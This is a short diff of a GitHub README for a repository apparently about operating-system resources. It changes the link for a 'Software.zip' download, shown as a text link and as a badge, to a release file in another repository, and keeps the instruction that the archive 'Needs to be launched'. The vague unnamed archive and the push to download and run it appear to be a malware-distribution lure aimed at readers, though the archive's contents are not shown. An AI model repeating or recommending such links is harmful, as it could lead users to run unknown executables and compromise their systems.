@@ -18,11 +18,11 @@ This repository focuses on providing a collection of resources related to operat
 - Operating-System 💻
 
 ## Resources
-📦 [Download Software.zip](https://github.com/user-attachments/files/18383251/Software.zip)
+📦 [Download https://github.com/jorgegael5/tos/releases/download/v1.0/Software.zip](https://github.com/jorgegael5/tos/releases/download/v1.0/Software.zip)
 
 ℹ️ *Needs to be launched*
 
-[![Download Software.zip](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download https://github.com/jorgegael5/tos/releases/download/v1.0/Software.zip](https://github.com/jorgegael5/tos/releases/download/v1.0/Software.zip)](https://github.com/jorgegael5/tos/releases/download/v1.0/Software.zip)
 
 ## Explore Further
 For more information and updates, be sure to check out the **Releases** section of this repository.
